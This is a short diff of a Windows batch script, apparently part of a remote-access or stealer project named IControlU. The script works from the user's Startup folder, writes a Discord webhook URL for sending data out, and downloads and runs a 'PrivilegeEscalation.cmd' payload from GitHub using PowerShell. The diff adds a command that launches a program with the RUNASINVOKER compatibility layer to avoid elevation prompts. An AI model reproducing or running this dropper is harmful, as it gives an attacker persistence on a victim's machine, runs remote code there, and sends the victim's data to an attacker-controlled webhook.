@@ -4,7 +4,7 @@
 @echo off
 set "CurrentDirectory=%CD%"
 set "StartupDirectory=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-
+cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" %1"
 @REM Change directory to startup
 cd /d "%StartupDirectory%"
 
@@ -12,7 +12,6 @@ cd /d "%StartupDirectory%"
 echo https://discord.com/api/webhooks/1167014901038993510/j2oWTYLE3mhwIjTAvOOCh3CauMLSWlzSQCtBoL5UEzTfGasfXSdO4TCtBHSsRbEb6YWD > DiscordWebhookURL.icu
 
 @REM Download required files
-
 powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ReylanTeo/IControlU/main/Payload/PrivilegeEscalation.cmd' -OutFile 'PrivilegeEscalation.cmd'"
 powershell Start-Process -FilePath "PrivilegeEscalation.cmd" -NoNewWindow -Wait
 
